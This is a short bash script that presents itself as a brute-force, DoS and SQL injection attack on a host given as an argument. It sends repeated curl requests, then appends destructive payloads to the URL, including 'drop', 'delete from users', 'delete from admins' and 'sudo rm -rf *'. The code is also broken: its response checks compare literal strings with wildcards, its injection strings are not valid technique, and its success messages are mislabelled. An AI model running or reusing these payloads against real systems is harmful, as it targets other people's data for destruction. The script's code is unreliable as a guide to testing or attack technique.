#!/usr/bin/env bash


# get host to perform attack
HOST=$1

# message
echo "Starting Brute Force attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

echo "\n";

# make a loop to perform DoS attack
for _ in {1..100}
do
  TMP=$(curl -i -X GET "$HOST")
  echo Got: "$TMP"

  if [[ "$TMP" == *"400"* ]]; then
    echo "System is secure on DoS attack!"
    exit 1;
  fi

  sleep 1s;
done

# make a single requests to perform SQL injection attack
HOST1="$1/;drop *;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from users where name like '*admin*' or name like '*root*';"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from admins limit 1;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from admins;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

sleep 5s;

HOST1="$1/;sudo rm -rf *;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

echo "Secure on Brute Force attacks!";

exit 1;
